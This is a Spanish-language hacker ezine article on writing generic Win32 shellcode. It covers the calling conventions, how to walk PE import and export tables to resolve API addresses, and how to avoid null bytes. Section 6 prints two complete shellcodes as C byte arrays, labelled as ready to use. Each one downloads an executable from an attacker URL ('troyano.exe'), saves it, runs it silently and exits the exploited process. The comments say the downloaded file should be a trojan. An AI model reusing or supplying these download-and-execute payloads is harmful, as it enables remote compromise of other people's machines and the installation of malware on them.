@@ -1,0 +1,623 @@
+=-[ 0x03 ]-==================================================================
+=-[ NetSearch Ezine #7 ]-====================================================
+=-[ Shellcodes + Overflows en Win32 (I) ]-===================================
+=-[ por RaiSe ]-=============================================================
+
+
+
+
+----
+ 
+ + Indice Global:
+ 
+	. Primera parte: 'Shellcodes' (por RaiSe). 
+	. Segunda parte: 'Overflows'  (por Eid0).
+ 
+----
+
+
+
+==[ Shellcodes en Win32 ]====================================================
+==[ por RaiSe ]==============================================================
+
+
+
+--------------
+0.- Indice
+--------------
+
+
+0.- Indice
+1.- Introduccion
+2.- Scodes en Win32
+3.- Breve descripcion del formato PE
+4.- Export Table
+5.- Ejecutando la shellcode
+6.- Shellcodes en formato C
+7.- Comentarios
+8.- Despedida
+
+
+----------------------
+1. Introduccion
+----------------------
+
+Por fin me he decidido a escribir un articulo sobre shellcodes en win32. Hace
+ya algun tiempo que saque una shellcode para practicamente cualquier Windows
+de Microsoft, asi que me basare en ella para escribir este texto. Tengo que
+aclarar que no soy ningun experto en sistemas operativos Windows, asi que es
+posible que este documento tenga algun error tecnico (espero que no). Si
+alguien detecta alguno por favor que me lo haga saber a traves de
+raise@netsearch-ezine.com.
+
+Pues bueno, despues de lo dicho comenzare describiendo un poco por encima la
+shellcode que analizaremos. Como algunos sabreis el mayor problema de las
+shellcodes (scodes) en win32 son las direcciones 'hardcodeadas'. Se entiende
+por direccion hardcodeada aquella que se presupone basandose en datos como el
+Sistema Operativo, la version de un programa concreto, etc. Lo ideal
+obviamente es no basarse en ninguna direccion hardcodeada, sino sacar el
+offset directamente de la imagen del binario en memoria. Sino se hace esto
+ultimo se corre el riesgo de que muchas veces no funcione la shellcode, o de
+tener que andar calculando y reescribiendo la scode cada vez que vayamos a
+progrmar un exploit.
+
+Algo muy comodo para el programador seria una scode que no dependiera de
+ninguna (o casi ninguna) direccion hardcodeada. Dicha scode deberia ser
+multiplataforma (varios Windows), y que no hiciera falta retocarla para que
+funcionase. Una forma de hacer esto es (como ya he dicho) sacando las
+direcciones de la propia imagen del binario en memoria. Ello implica un
+minimo conocimiento del formato PE (Portable Executable), que es la
+estructura que llevan los programas en win32.
+
+Antes de meternos a fondo con la shellcode hagamos un repaso a la
+programacion de las mismas en win32. No es que sean muy diferentes a las de
+Linux, pero tiene unas caracteristicas bastante particulares.
+
+
+----------------------------
+2.- Scodes en Win32
+----------------------------
+
+Como sabreis las shellcodes en Linux usan las llamadas 'syscalls', que las
+provee el kernel. Para ello poniamos en los registros los argumentos de la
+misma, y ejecutabamos la interrupcion 0x80. En win32 no existen syscalls,
+aqui usaremos las api de Windows, cuyas funciones se encuentran situadas en
+dlls.
+
+La forma de llamar a una funcion es la siguiente:
+
+    Push argumento2
+    Push argumento1
+    Call direccion_funcion
+    
+Es decir, se usa la pila para colocar los argumentos en orden inverso (el
+primer argumento de la funcion sera el ultimo en 'pushear'). Esto en realidad
+es la misma forma de como lo hace Linux con las glibc, y que yo sepa la
+mayoria de los SO's (al menos en procesadores x86). Pues bien, ahora lo
+complicado es lo siguiente: como averiguar la direccion de la funcion?.
+
+Para resolver dicha cuestion usualmente nos basaremos en las dos siguientes
+funciones: LoadLibraryA y GetProcAddress. Ambas se encuentran en la dll
+'kernel32.dll', incluido en todos los Windows de la familia Microsoft (al
+menos desde el 95 hasta el XP). La sintaxis de ambas es la siguiente:
+
+Direccion_base_libreria = LoadLibraryA("ejemplo.dll");
+Direccion_base_funcion1 =
+GetProcAddress(Direccion_base_libreria, "funcion1");
+
+Es decir, LoadLibraryA carga y nos devuelve la direccion base de una dll.
+Dicha direccion la usaremos en GetProcAddress para conseguir la direccion de
+funcion1, incluida en dicha dll. Si la dll ya estuviera cargada en memoria,
+LoadLibraryA nos devolveria la direccion igualmente. Por cierto, la A de
+LoadLibraryA es porque esta funcion es la version Ansi de la misma. Algunas
+funciones tienen version Ansi y version Unicode. Nosotros siempres usaremos
+las Ansi.
+
+Bueno, ya sabemos como cargar dlls, y como recuperar direcciones de funciones
+de las mismas para poder usarlas en nuestra shellcode. Pero seguimos teniendo
+un problema, como conseguir las direcciones de esas dos funciones?. Hasta
+ahora lo que se hacia era conseguir dichas direcciones con un debugger para
+un SO en concreto, pero esto tiene graves problemas. Y es que los valores de
+las mismas cambian segun que service pack haya instalado, no sirve para otro
+SO de la misma familia (ejemplo Windows NT Workstation y Windows NT Server),
+etc.. Resumiendo, utilizando este metodo no seria una shellcode generica.
+
+Hay otros metodos como referenciar dichas direcciones desde la imagen del
+binario en memoria, pero sin calcularlas en tiempo de ejecucion, sino que hay
+que meter los valores al programar la shellcode. La ventaja de este metodo es
+que si funciona en varios Windows, pero no para distintos binarios. Estamos
+cambiando la dependencia del SO por la dependencia del binario. Este metodo
+tambien implica la modificacion de la scode cada vez que se programa un
+exploit, con la consiguiente perdida de tiempo. Como he dicho, lo que
+buscamos es una shellcode que NO haya que modificar para que funcione, asi
+que este metodo tampoco nos vale.
+
+Entonces, cual es la solucion a todos estos problemas?. Muy sencillo, debido
+a que la mayoria de los programas para Windows tienen la misma direccion base
+en memoria (00400000h), deberemos en tiempo de ejecucion rastrear dicha
+imagen, y movernos a traves del PE para sacar las direcciones. Practicamente
+el 100% de los programas cargan en memoria la dll 'kernel32', asi que tambien
+deberemos rastrear dicha dll para conseguir las funciones. Esto lo veremos
+detenidamente mas adelante :). Ahora, hagamos un breve repaso a las
+caracteristicas del formato PE que Windows utiliza.
+
+
+---------------------------------------------
+3.- Breve descripcion del formato PE
+---------------------------------------------
+
+Hay bastantes documentos por ahi que describen en profundidad este formato de
+ejecutable. No es mi intencion ni mucho menos hacer un analisis exahustivo
+del mismo, os recomiendo para ello un documento disponible en la web de
+Microsoft (PECOFF). En este apartado nombrare un poco las secciones que nos
+interesan para hacer funcionar nuestra shellcode.
+
+Pues bueno, para empezar todo ejecutable (ya se una exe o una dll) tiene una
+direccion base que es donde se carga en memoria. Como ya he comentado en los
+exe's el 99% de las veces es 00400000h. En las dll's esta direccion varia
+dependiendo del Sistema Operativo, ServicePacks instalados, etc. Se conoce
+como direccion RVA (Relative Virtual Address) a un offset que sumado a la
+direccion base da como resultado el VA (Virtual Address). Un ejemplo
+sencillo:
+
+Ibase (Imagen base abreviado) = 00400000h
+RVA de Pepe = 200h
+VA de Pepe = Ibase + RVA = 00400200h
+
+El VA es lo que nos interesa para poder llamar a las funciones, ya que
+haremos 'call VA_Funcion'. Pues bien, a nosotros mas o menos solo nos
+interesaran las secciones Import Table (itable) y Export Table (etable). La
+itable contendra informacion de funciones externas residentes en dlls, que se
+llamaran desde el propio binario. Y la etable todo lo contrario, contendra
+informacion de funciones internas que seran llamadas desde otro binario o
+dll. Como habreis podido deducir, lo que haremos sera rastrear la itable del
+programa vulnerable, y mas tarde la etable de la dll 'kernel32.dll'. Cada
+tabla contiene entre otras cosas el nombre de la librer¡a, numero de
+funciones que contiene, el nombre de cada funcion, la VA de cada funcion,
+etc.
+
+Para llegar a la itable (y luego a la etable de kernel32.dll) necesitaremos
+rastrear la imagen del binario en memoria. Seria imposible explicar aqu¡ el
+formato PE completo, asi que os recomiendo un analisis exahustivo de dicho
+formato para poder seguir lo que hace la shellcode. Aun asi pegare aqui
+brevemente el formato de la itable y de la etable.
+
+Nada mas empezar la imagen nos encontraremos una cabecera y una seccion para
+hacer compatible el binario con el antiguo formato de MS-DOS. Dicha seccion
+normalmente lo que hara sera mostrar un mensaje tipo: "Version Incorrecta", y
+salir del proceso. Justo despues de dicha seccion estara el PE Header. La
+forma facil de llegar a el es usar un Offset que contendra la direccion
+relativa del PE Header. Dicho Offset se encuentra al principio de la seccion
+de MS-DOS Compatible, a 3Ch para ser exactos de 00400000h. Una vez en el PE
+Header sabemos que la itable comienza a 80h del mismo, asi que ya estaremos
+en situacion de empezar a explorar :). Una vez situados en la itable nos
+encontraremos lo siguiente:
+
+
+    Directory Table
+    Null Entry
+
+    DLL1 Import Lookup Table
+    Null
+
+    DLL2 Import Lookup Table
+    Null
+
+    ..
+
+    Hint-Name Table
+
+
+Os estareis preguntando: que narices es todo esto?. Pues varias cosas.. Lo
+primero que encontramos es el Directory Table, que es una tabla de 20 bytes
+de longitud que sigue la siguiente estructura:
+
+
+Offset   Size  Campo            Descripcion
+------------------------------------------------------------
+0        4     Import Lookup    RVA de la Import Lookup
+               Table RVA        Table.
+4        4     Time/Date        Time/data stamp de la DLL.
+               Stamp
+8        4     Fowarder Chain   Index of first forwarder
+                                reference.
+12       4     Name RVA         RVA del nombre en ascii de
+                                la DLL.
+16       4     Import Address   RVA de la Import Address
+               Table RVA        Table.
+
+
+A nosotros solo nos interesan el primer campo, el cuarto y el ultimo. El
+primero contiene la direccion relativa de la Import Lookup Table, que tiene
+la siguiente estructura:
+
+
+Bit(s)     Size  Bit Campo       Descripcion
+------------------------------------------------------------
+31 / 63    1     Ordinal/Name    Si el bit esta seteado,
+                 Flag            se importa por ordinal.
+                                 Sino se importa por
+                                 nombre.
+30 - 0 /   31 /  Ordinal Number  Numero ordinal.
+62 - 0     63
+30 - 0 /   31 /  Hint/Name       RVA de la Hint/Name Table
+62 - 0     63    Table RVA       RVA.
+
+
+Hay dos formas de importar una funcion, por numero ordinal o por el nombre de
+la misma. Si es por numero ordinal, la lookup table contendra un valor de 32
+bits (en la table pone 32 o 64, pero en x86 es de 32) cuyo bit 31 esta
+seteado. Como los numeros ordinales no suelen tener valores altos, nosotros
+lo que haremos sera comparar el byte de mas valor con 80h, para saber si es
+import por ordinal o por nombre.
+
+Si el byte 31 esta desactivado, la lookup table contrendra un valor de 32
+bits (cuyo bit de mas valor esta a cero) que sera la RVA de la Hint/Name
+Table, cuya estructura es la siguiente:
+
+
+Offset   Size       Campo    Descripcion
+----------------------------------------------------------
+0        2          Hint     No nos importa.
+2        variable   Name     String ASCII de la funcion a
+                             importar (case sensitive).
+*        0 or 1     Pad      Pad de alineamiento.
+
+
+Es decir, en la VA de Hint/Name Table + 2, estara el string de la funcion a
+importar. Resumiendo, la shellcode lo que hara sera ir comparando en cada
+entrada del Directory Table el nombre de la dll para ver si es kernel32.dll,
+si lo es saltara a la Import Lookup Table. Una vez alli ira comparando cada
+funcion para ver cual es LoadLibraryA (o GetModuleHandleA, segun la
+shellcode) mirando el nombre de la misma en la Hint/Name Table, y comprobando
+primero que no sea importada por ordinal.
+
+Una vez que sepamos en que posicion de la Import Lookup Table esta
+LoadLibraryA, sera la hora de averiguar su direccion VA dentro de la dll.
+Para eso usaremos la Import Address Table, que no es mas que un array de
+punteros de 32 bits a las direcciones virtuales (VA) de cada funcion. Por
+ejemplo, si LoadLibraryA estaba en la posicion 5 de la Import Lookup Table,
+en la direccion de la Import Address Table + (5*4) estara la VA de la
+funcion.
+
+Una vez tengamos la direccion de LoadLibraryA hacemos un call para sacar la
+direccion VA de kernel32.dll en memoria: LoadLibraryA("KERNEL32"). Cuando la
+tengamos habra que sacar la direccion de GetProcAddress de la Export Table de
+la dll, y una vez la averiguemos, habra que cargar 'wininet.dll', y sacar con
+un par de bucles las direcciones de cada funcion (usando GetProcAddress).
+
+Veamoslo en el siguiente apartado.
+
+
+----------------------
+4.- Export Table
+----------------------
+
+
+Bueno, pues se supone que ya tenemos la direccion de LoadLibraryA y nos
+disponemos a rastrear la Export Table. Ya se que hasta aqui es todo muy
+teorico pero es que sino no se como explicarlo.. Veamos, lo primero es ir a
+la direccion base de KERNEL32 (que nos la devolvio LoadLibraryA). Una vez
+alli rastreando el PE Header nos vamos a la Export Table. Nos encontramos
+esto:
+
+
+Table Name                    Descripcion
+---------------------------------------------------------------------
+Export Directory Table        Informacion muy interesante.
+Export Address Table          Array of RVA's de las funciones.
+Name Pointer Table            Array de punteros a los nombres de las
+                              funciones.
+Ordinal Table                 Array de ordinales.
+Export Name Table             Cadenas ASCII terminadas en nulls y
+                              seguidas en memoria, correspondientes a
+                              las funciones (entre otras cosas) a
+                              exportar.
+
+
+Pues bien, como veis esto es un tanto lioso de seguir. La Export Address
+Table contendra las RVA (relativas a la base de la dll) de las funciones a
+exportar. La Name Pointer Table contendra punteros que estan apuntando cada
+uno a la Export Name Table, que es la que contiene las cadenas en ascii. Y la
+Ordinal Table contendra numeros ordinales que serviran de indice en la Export
+Address Table.
+
+Es decir, lo primero seria ir a la Name Pointer Table. De ahi comparar el
+nombre al que apunta cada puntero con 'GetProcAddress', si coincide usar la
+posicion en que se encontro en la Ordinal Table a modo de indice. Por ejemplo
+si GetProcAddress estaba en la posicion 5 de la Name Pointer Table el ordinal
+estara en la direccion de Ordinal Table + (5*2), ya que los ordinales son de
+16 bits. El ordinal que este en esa posicion se usara de indice en la Export
+Address Table para sacar la RVA de la funcion.
+
+La estructura de la Export Directory Table es la siguiente:
+
+
+Offset   Size  Campo            Descripcion
+------------------------------------------------------------
+0        4     Export Flags     No interesa.
+4        4     Time/Date        No interesa.
+               Stamp
+8        2     Major Version    No interesa.
+10       2     Minor Version    No interesa.
+12       4     Name RVA         RVA del nombre en ascii de
+                                la dll.
+16       4     Ordinal Base     Ordinal base inicial.
+                                Normalmente 1.
+20       4     Address Table    Numero de entradas en la
+               Entries          Export Address Table.
+24       4     Number of Name   Numero de entradas en la
+               Pointers         Name Pointer Table (las
+                                mismas que en la Ordinal
+                                Table).
+28       4     Export Address   RVA de la Export Address
+               Table RVA        Table.
+32       4     Name Pointer     RVA de la Export Name
+               RVA              Pointer Table.
+36       4     Ordinal Table    RVA de la Ordinal Table.
+               RVA
+
+
+Usaremos el numero de entradas en la Name Pointer Table para saber cuando
+debemos parar el bucle. Una vez que tengamos la VA de GetProcAddress
+procederemos a cargar wininet.dll, y a sacar las siguientes funciones.
+
+  *   Funciones de KERNEL32.dll:
+  
+  . _lcreat
+  . _lwrite
+  . _GlobalAlloc
+  . _lclose
+  . Winexec
+  . ExitProcess
+
+  *   Funciones de WININET.dll:
+  
+  . InternetOpenA
+  . InternetOpenUrlA
+  . InternetReadFile
+  . InternetCloseHandle
+  
+
+Despues de tener todas las VA guardadas (usaremos ebp como offset para
+referenciarlas), podemos empezar a ejecutar la shellcode x fin.
+
+
+-------------------------------------
+5.- Ejecutando la shellcode
+-------------------------------------
+
+Al fin podemos ejecutar la shellcode propiamente dicha. Lo que hicimos hasta
+aqui fue recuperar las direcciones de cada funcion. Ahora, resumiendo,
+veremos lo que hace la scode.
+
+. Primero reservamos memoria con GlobalAlloc, 2 Mb y algo para ser exactos.
+Aqui es donde guardaremos el archivo que leeremos de Internet antes de
+salvarlo en el disco. La direccion que devuelve la guardamos usando ebp como
+offset.
+
+. Llamamos a InternetOpenA para inicializar la conexion.
+
+. Llamamos a InternetOpenUrlA pasandole la direccion exacta para conectar con
+el server Web.
+
+. Llamamos a InternetReadFile y guardamos el archivo en la zona de memoria
+que reservamos antes con GlobalAlloc.
+
+. Cerramos las conexiones con InternetCloseHandle.
+
+. Llamamos a _lcreat para crear el archivo en el directorio de trabajo
+actual.
+
+. Lo escribimos con _lwrite y lo cerramos con _lclose.
+
+. Ejecutamos en otro proceso el archivo valiendonos de Winexec.
+
+. Salimos del proceso padre con ExitProcess para que no de ningun warning el
+programa vulnerable que explotamos.
+
+Finito :). Lo he ultra-resumido porque sino se haria eterno. El que quiera
+puede bajarse las fuentes en ensamblador con comentarios de la web
+http://www.undersec.com. Abajo incluyo las dos shellcodes listas para ser
+usadas en formato C.
+
+
+-------------------------------------
+6.- Shellcodes en formato C
+-------------------------------------
+
+
+<++>
+/*
+ * Shellcode generica en todos los windows de la familia 98/ME/NT/2000/XP
+ * Necesita tener la funcion GetModuleHandleA en la import table
+ * Probabilidades de que funcione: 99,99%
+ * 790 bytes
+ *
+ * Una vez ejecutada se baja el fichero de la URL escogida, lo ejecuta
+ * silenciosamente y sale del proceso original. Dicho fichero puede (y
+ * debe }:) ) ser un troyano. El limite de tamaño es de 2.2 mb del fichero
+ * a bajar aproximadamente, y se guarda con el nombre 'nssc.exe' en el 
+ * ordenador remoto. Lo unico modificable de la shellcode es la URL.
+ */
+
+
+char scode[] =
+"\xEB\x30\x5F\xFC\x8B\xF7\x80"
+"\x3F\x08\x75\x03\x80\x37\x08\x47\x80\x3F\x01\x75\xF2\x8B\xE6\x33\xD2\xB2\x04\xC1"
+"\xE2\x08\x2B\xE2\x8B\xEC\x33\xD2\xB2\x03\xC1\xE2\x08\x2B\xE2\x54\x5A\xB2\x7C\x8B"
+"\xE2\xEB\x02\xEB\x57\x89\x75\xFC\x33\xC0\xB4\x40\xC1\xE0\x08\x89\x45\xF8\x8B\x40"
+"\x3C\x03\x45\xF8\x8D\x40\x7E\x8B\x40\x02\x03\x45\xF8\x8B\xF8\x8B\x7F\x0C\x03\x7D"
+"\xF8\x81\x3F\x4B\x45\x52\x4E\x74\x07\x83\xC0\x14\x8B\xF8\xEB\xEB\x50\x8B\xF8\x33"
+"\xC9\x33\xC0\xB1\x10\x8B\x17\x03\x55\xF8\x52\xEB\x03\x57\x8B\xD7\x80\x7A\x03\x80"
+"\x74\x16\x8B\x32\x03\x75\xF8\x83\xC6\x02\xEB\x02\xEB\x7E\x8B\x7D\xFC\x51\xF3\xA6"
+"\x59\x5F\x74\x06\x40\x83\xC7\x04\xEB\xDB\x5F\x8B\x7F\x10\x03\x7D\xF8\xC1\xE0\x02"
+"\x03\xF8\x8B\x07\x8B\x5D\xFC\x8D\x5B\x11\x53\xFF\xD0\x89\x45\xF4\x8B\x40\x3C\x03"
+"\x45\xF4\x8B\x70\x78\x03\x75\xF4\x8D\x76\x1C\xAD\x03\x45\xF4\x89\x45\xF0\xAD\x03"
+"\x45\xF4\x89\x45\xEC\xAD\x03\x45\xF4\x89\x45\xE8\x8B\x55\xEC\x8B\x75\xFC\x8D\x76"
+"\x1E\x33\xDB\x33\xC9\xB1\x0F\x8B\x3A\x03\x7D\xF4\x56\x51\xF3\xA6\x59\x5E\x74\x06"
+"\x43\x8D\x52\x04\xEB\xED\xD1\xE3\x8B\x75\xE8\x03\xF3\x33\xC9\x66\x8B\x0E\xEB\x02"
+"\xEB\x7D\xC1\xE1\x02\x03\x4D\xF0\x8B\x09\x03\x4D\xF4\x89\x4D\xE4\x8B\x5D\xFC\x8D"
+"\x5B\x2D\x33\xC9\xB1\x07\x8D\x7D\xE0\x53\x51\x53\x8B\x55\xF4\x52\x8B\x45\xE4\xFC"
+"\xFF\xD0\x59\x5B\xFD\xAB\x8D\x64\x24\xF8\x38\x2B\x74\x03\x43\xEB\xF9\x43\xE2\xE1"
+"\x8B\x45\xE0\x53\xFC\xFF\xD0\xFD\xAB\x33\xC9\xB1\x04\x8D\x5B\x0C\xFC\x53\x51\x53"
+"\x8B\x55\xC4\x52\x8B\x45\xE4\xFF\xD0\x59\x5B\xFD\xAB\x38\x2B\x74\x03\x43\xEB\xF9"
+"\x43\xE2\xE5\xFC\x33\xD2\xB6\x1F\xC1\xE2\x08\x52\x33\xD2\x52\x8B\x45\xD4\xFF\xD0"
+"\x89\x45\xB0\x33\xD2\xEB\x02\xEB\x77\x52\x52\x52\x52\x53\x8B\x45\xC0\xFF\xD0\x8D"
+"\x5B\x03\x89\x45\xAC\x33\xD2\x52\xB6\x80\xC1\xE2\x10\x52\x33\xD2\x52\x52\x8D\x7B"
+"\x09\x57\x50\x8B\x45\xBC\xFF\xD0\x89\x45\xA8\x8D\x55\xA0\x52\x33\xD2\xB6\x1F\xC1"
+"\xE2\x08\x52\x8B\x4D\xB0\x51\x50\x8B\x45\xB8\xFF\xD0\x8B\x4D\xA8\x51\x8B\x45\xB4"
+"\xFF\xD0\x8B\x4D\xAC\x51\x8B\x45\xB4\xFF\xD0\x33\xD2\x52\x53\x8B\x45\xDC\xFF\xD0"
+"\x89\x45\xA4\x8B\x7D\xA0\x57\x8B\x55\xB0\x52\x50\x8B\x45\xD8\xFF\xD0\x8B\x55\xA4"
+"\x52\x8B\x45\xD0\xFF\xD0\xEB\x02\xEB\x12\x33\xD2\x90\x52\x53\x8B\x45\xCC\xFF\xD0"
+"\x33\xD2\x52\x8B\x45\xC8\xFF\xD0\xE8\xE6\xFD\xFF\xFF\x47\x65\x74\x4D\x6F\x64\x75"
+"\x6C\x65\x48\x61\x6E\x64\x6C\x65\x41\x08\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2E\x64"
+"\x6C\x6C\x08\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73\x08\x4C\x6F"
+"\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x08\x5F\x6C\x63\x72\x65\x61\x74\x08\x5F"
+"\x6C\x77\x72\x69\x74\x65\x08\x47\x6C\x6F\x62\x61\x6C\x41\x6C\x6C\x6F\x63\x08\x5F"
+"\x6C\x63\x6C\x6F\x73\x65\x08\x57\x69\x6E\x45\x78\x65\x63\x08\x45\x78\x69\x74\x50"
+"\x72\x6F\x63\x65\x73\x73\x08\x77\x69\x6E\x69\x6E\x65\x74\x2E\x64\x6C\x6C\x08\x49"
+"\x6E\x74\x65\x72\x6E\x65\x74\x4F\x70\x65\x6E\x41\x08\x49\x6E\x74\x65\x72\x6E\x65"
+"\x74\x4F\x70\x65\x6E\x55\x72\x6C\x41\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x52\x65"
+"\x61\x64\x46\x69\x6C\x65\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x43\x6C\x6F\x73\x65"
+"\x48\x61\x6E\x64\x6C\x65\x08\x4E\x53\x08\x6E\x73\x73\x63\x2E\x65\x78\x65\x08"
+"http://www.host.com/troyano.exe"
+"\x08\x01";
+
+<-->
+
+<++>
+/*
+ * Shellcode generica en todos los windows de la familia98/ME/NT/2000/XP
+ * Necesita tener la funcion LoadLibraryA en la import table
+ * Probabilidades de que funcione: 98%
+ * 710 bytes
+ *
+ * Una vez ejecutada se baja el fichero de la URL escogida, lo ejecuta
+ * silenciosamente y sale del proceso original. Dicho fichero puede (y
+ * debe }:) ) ser un troyano. El limite de tamaño es de 2.2 mb del fichero
+ * a bajar aproximadamente, y se guarda con el nombre 'x.exe' en el ordenador
+ * remoto. Lo unico modificable de la shellcode es la URL.
+ */
+
+
+char scode[] =
+"\xEB\x5D\x5F\x8B\xF7\x80\x3F"
+"\x08\x75\x03\x80\x37\x08\x47\x80\x3F\x01\x75\xF2\x33\xC9\xB5\x05\x8B\xFE\x2B\xF9"
+"\x8B\xEF\xB5\x03\x2B\xF9\x8B\xD7\xB2\x7C\x8B\xE2\x89\x75\xFC\xB5\x40\xC1\xE1\x08"
+"\x89\x4D\xF8\x8D\x49\x3C\x8B\x09\x03\x4D\xF8\x8D\x49\x7F\x41\x8B\x09\x03\x4D\xF8"
+"\x8B\xD9\x8B\x49\x0C\x03\x4D\xF8\x81\x39\x4B\x45\x52\x4E\x74\x07\x8D\x5B\x14\x8B"
+"\xCB\xEB\xEB\x33\xC0\x53\xEB\x02\xEB\x7C\x8B\x33\x03\x75\xF8\x80\x7E\x03\x80\x74"
+"\x14\x8B\x3E\x03\x7D\xF8\x47\x47\x56\x8B\x75\xFC\x33\xC9\xB1\x0D\xF3\xA6\x5E\x74"
+"\x06\x40\x8D\x76\x04\xEB\xE0\x5B\x8B\x5B\x10\x03\x5D\xF8\xC1\xE0\x02\x03\xD8\x8B"
+"\x03\x89\x45\xF4\x8B\x5D\xFC\x8D\x5B\x0D\x53\xFF\xD0\x89\x45\xF0\x8D\x5B\x09\x53"
+"\x8B\x45\xF4\xFF\xD0\x89\x45\xEC\x8B\x45\xF0\x8B\x40\x3C\x03\x45\xF0\x8B\x40\x78"
+"\x03\x45\xF0\x89\x45\xE8\x8B\x40\x20\x03\x45\xF0\x8D\x7B\x08\x33\xD2\x57\x8B\x30"
+"\x03\x75\xF0\x33\xC9\xB1\x0F\xF3\xA6\x74\x0B\x5F\xEB\x02\xEB\x7A\x42\x8D\x40\x04"
+"\xEB\xE7\x8B\x5D\xE8\x33\xC9\x53\x5F\x8B\x7F\x24\x03\x7D\xF0\xD1\xE2\x03\xFA\x66"
+"\x8B\x0F\x8B\x5B\x1C\x03\x5D\xF0\xC1\xE1\x02\x03\xD9\x8B\x1B\x03\x5D\xF0\x89\x5D"
+"\xE4\x8B\x55\xFC\x8D\x52\x2D\x8D\x7D\xE0\x33\xC9\xB1\x06\x51\x52\x52\x8B\x75\xF0"
+"\x56\xFC\xFF\xD3\xFD\xAB\x5A\x59\x38\x2A\x74\x03\x42\xEB\xF9\x42\xE2\xE8\xB1\x04"
+"\x51\x52\x52\x8B\x75\xEC\x56\xFC\xFF\xD3\xFD\xAB\x5A\x59\x38\x2A\x74\x03\x42\xEB"
+"\xF9\x42\xE2\xE8\xFC\x52\x33\xD2\xB6\x1F\xC1\xE2\x08\x52\x33\xD2\xEB\x02\xEB\x7C"
+"\x52\x8B\x45\xD8\xFF\xD0\x5B\x89\x45\xB8\x33\xD2\x52\x52\x52\x52\x53\x8B\x45\xC8"
+"\xFF\xD0\x89\x45\xB4\x8D\x7B\x08\x33\xD2\x52\xB6\x80\xC1\xE2\x10\x52\x33\xD2\x52"
+"\x52\x57\x50\x8B\x45\xC4\xFF\xD0\x89\x45\xB0\x8D\x55\xAC\x52\x33\xD2\xB6\x1F\xC1"
+"\xE2\x08\x52\x8B\x4D\xB8\x51\x50\x8B\x45\xC0\xFF\xD0\x8B\x4D\xB0\x51\x8B\x45\xBC"
+"\xFF\xD0\x8B\x4D\xB4\x51\x8B\x45\xBC\xFF\xD0\x33\xD2\x52\x43\x43\x53\x8B\x45\xE0"
+"\xFF\xD0\x89\x45\xA8\x8B\x7D\xAC\x57\x8B\x55\xB8\x52\x50\x8B\x45\xDC\xFF\xD0\x8B"
+"\x55\xA8\xEB\x02\xEB\x17\x52\x8B\x45\xD4\xFF\xD0\x33\xD2\x52\x53\x8B\x45\xD0\xFF"
+"\xD0\x33\xD2\x52\x8B\x45\xCC\xFF\xD0\xE8\x0D\xFE\xFF\xFF\x4C\x6F\x61\x64\x4C\x69"
+"\x62\x72\x61\x72\x79\x41\x08\x4B\x45\x52\x4E\x45\x4C\x33\x32\x08\x57\x49\x4E\x49"
+"\x4E\x45\x54\x08\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73\x08\x5F"
+"\x6C\x63\x72\x65\x61\x74\x08\x5F\x6C\x77\x72\x69\x74\x65\x08\x47\x6C\x6F\x62\x61"
+"\x6C\x41\x6C\x6C\x6F\x63\x08\x5F\x6C\x63\x6C\x6F\x73\x65\x08\x57\x69\x6E\x45\x78"
+"\x65\x63\x08\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73\x08\x49\x6E\x74\x65\x72"
+"\x6E\x65\x74\x4F\x70\x65\x6E\x41\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x4F\x70\x65"
+"\x6E\x55\x72\x6C\x41\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x52\x65\x61\x64\x46\x69"
+"\x6C\x65\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x43\x6C\x6F\x73\x65\x48\x61\x6E\x64"
+"\x6C\x65\x08\x72\x08\x78\x2E\x65\x78\x65\x08"
+"http://www.host.com/troyano.exe"
+"\x08\x01";
+
+<-->
+
+
+------------------------
+7.- Comentarios
+------------------------
+
+Antes de finalizar me gustaria comentar varios puntos de la(s) shellcode(s).  
+El primero es el metodo que use para resolver el problema de saber la
+direccion de los strings en memoria. En linux es muy tipico el metodo
+siguiente:
+
+**
+     Jmp pepe
+
+Maria:
+     pop edi
+     Codigo
+
+Pepe:
+     Call maria
+     strings
+**
+
+De esta forma se sabe exactamente la direccion de los
+strings. El problema es que si se pone un salto mayor que
+7Fh el jmp produce un null (mejor dicho varios). Ya que la
+instruccion se convierte en:
+
+Jmp 00000085h   ->   Ejemplo
+
+La solucion que tome fue poner varios saltos en toda la
+shellcode. De esta forma quedo algo asi:
+
+**
+     Jmp pepe
+
+Lala:
+     pop edi
+     Codigo
+     Jmp maria
+
+Pepe:
+     jmp pepe2
+
+Maria:
+     codigo
+
+Pepe2:
+     call lala
+     Strings
+**
+
+De esta forma se consigue ejecutar el call, que al ser negativo puede saltar
+todos los bytes que se quiera que no incluira nulls, y se evita los mismos en
+los jmp's. En la scode tuve que poner 4 o 5 instrucciones de ese tipo.
+
+Otra cosa a tener en cuenta es que nada mas volver del call, la shellcode
+cambiara los valores de esp y de ebp, para evitar que al 'pushear' algo se
+sobreescriba el propio codigo de la scode. Esto es algo muy tipico pero muy
+util.
+
+Tambien hay que decir que el codigo se encuentra bastante optimizado, ya que
+el tamaño resultante final es bastante pequeño, teniendo en cuenta que
+rastrea la memoria para obtener las direcciones de las funciones, etc.
+
+
+-------------------
+8.- Despedida
+-------------------
+
+Bueno, pues esto ha llegado a su fin. Creo que no me he saltado nada.. Espero
+que os haya gustado y esas cosas ;). Ahora os dejo con eid0 que ha escrito un
+fantastico articulo sobre la explotacion de overflows en Win32, con exploit
+incluido. Hasta la proxima.
+
+
+RaiSe
+raise@netsearch-ezine.com
+
+
